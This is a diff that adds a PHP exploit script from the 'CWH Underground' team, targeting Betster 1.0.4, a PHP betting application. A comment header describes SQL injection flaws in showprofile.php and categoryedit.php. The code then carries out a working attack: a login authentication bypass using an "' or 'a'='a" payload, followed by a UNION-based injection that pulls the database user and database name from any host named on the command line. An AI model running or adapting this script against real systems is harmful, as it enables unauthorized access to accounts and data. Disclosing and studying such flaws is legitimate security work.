@@ -1,0 +1,151 @@
+<?php
+/*
+ 
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /        
+  / XXXXXX /
+ (________(          
+  `------'
+  
+ Exploit Title   : Betster (PHP Betoffice) Authentication Bypass and SQL Injection
+ Date            : 6 March 2015
+ Exploit Author  : CWH Underground
+ Discovered By   : ZeQ3uL
+ Site            : www.2600.in.th
+ Vendor Homepage : http://betster.sourceforge.net/
+ Software Link   : http://downloads.sourceforge.net/project/betster/betster-1.0.4.zip
+ Version         : 1.0.4
+ Tested on       : Linux, PHP 5.3.9
+   
+####################
+SOFTWARE DESCRIPTION
+####################
+   
+Betster is a Software to create a online bet-office based on PHP, MySQL and JavaScript. The system works with variable odds 
+(betting-exchange with variable decimal odds) and provides a CMS-like backend for handling the bets, users and categories.
+   
+################################################################
+VULNERABILITY: SQL Injection (showprofile.php, categoryedit.php)
+################################################################
+    
+An attacker might execute arbitrary SQL commands on the database server with this vulnerability.
+User tainted data is used when creating the database query that will be executed on the database management system (DBMS).
+An attacker can inject own SQL syntax thus initiate reading, inserting or deleting database entries or attacking the underlying operating system
+depending on the query, DBMS and configuration.
+   
+/showprofile.php (LINE: 63)
+-----------------------------------------------------------------------------
+if (($session->getState()) && 
+	(($user->getStatus() == "administrator") || 
+	 ($user->getStatus() == "betmaster"))){
+	$mainhtml = file_get_contents("tpl/showprofile.inc");
+
+	$id = htmlspecialchars($_GET['id']);				<<<< WTF !!
+	$xuser = $db_mapper->getUserById($id);
+-----------------------------------------------------------------------------
+    
+/categoryedit.php (LINE: 52)
+-----------------------------------------------------------------------------
+$id = htmlspecialchars($_GET['id']);					<<<< WTF !!
+$action = htmlspecialchars($_GET['ac']);
+----------------------------------------------------------------------------- 
+
+###########################################
+VULNERABILITY: Authentication Bypass (SQLi)
+###########################################
+  
+File index.php (Login function) has SQL Injection vulnerability, "username" parameter supplied in POST parameter for checking valid credentials.
+The "username" parameter is not validated before passing into SQL query which arise authentication bypass issue.
+ 
+#####################################################
+EXPLOIT
+#####################################################
+  
+*/
+ 
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 50);
+ 
+function http_send($host, $packet)
+{
+    if (!($sock = fsockopen($host, 80)))
+        die("\n[-] No response from {$host}:80\n");
+  
+    fputs($sock, $packet);
+    return stream_get_contents($sock);
+}
+ 
+print "\n+---------------------------------------------+";
+print "\n| Betster Auth Bypass & SQL Injection Exploit |";
+print "\n+---------------------------------------------+\n";
+  
+if ($argc < 3)
+{
+    print "\nUsage......: php $argv[0] <host> <path>\n";
+    print "\nExample....: php $argv[0] localhost /";
+    print "\nExample....: php $argv[0] localhost /betster/\n";
+    die();
+}
+ 
+$host = $argv[1];
+$path = $argv[2];
+
+$payload = "username=admin%27+or+%27a%27%3D%27a&password=cwh&login=LOGIN";
+
+$packet  = "GET {$path} HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Connection: close\r\n\r\n";
+
+   print "\n  ,--^----------,--------,-----,-------^--,   \n";
+   print "  | |||||||||   `--------'     |          O   \n";
+   print "  `+---------------------------^----------|   \n";
+   print "    `\_,-------, _________________________|   \n";
+   print "      / XXXXXX /`|     /                      \n";
+   print "     / XXXXXX /  `\   /                       \n";
+   print "    / XXXXXX /\______(                        \n";
+   print "   / XXXXXX /                                 \n";
+   print "  / XXXXXX /   .. CWH Underground Hacking Team ..  \n";
+   print " (________(                                   \n";
+   print "  `------'                                    \n";
+
+$response = http_send($host, $packet);
+
+ if (!preg_match("/Set-Cookie: ([^;]*);/i", $response, $sid)) die("\n[-] Session ID not found!\n");
+
+$packet  = "POST {$path}index.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cookie: {$sid[1]}\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Connection: close\r\n\r\n{$payload}";
+
+   print "\n\n[+] Bypassing Authentication...\n";
+   sleep(2);
+
+$response=http_send($host, $packet);
+
+preg_match('/menutitle">ADMIN/s', $response) ? print "\n[+] Authentication Bypass Successfully !!\n" : die("\n[-] Bypass Authentication Failed !!\n");
+ 
+$packet  = "GET {$path}showprofile.php?id=1%27%20and%201=2%20union%20select%201,concat(0x3a3a,0x557365723d,user(),0x202c2044425f4e616d653d,database(),0x3a3a),3,4,5,6,7--+ HTTP/1.0\r\n";
+$packet .= "Cookie: {$sid[1]}\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Connection: close\r\n\r\n";
+
+   print "[+] Performing SQL Injection Attack\n";
+   sleep(2);
+   
+$response1=http_send($host, $packet);
+
+preg_match('/::(.*)::/', $response1, $m) ? print "\n$m[1]\n" : die("\n[-] Exploit failed!\n");
+
+################################################################################################################
+# Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
+################################################################################################################
+?>
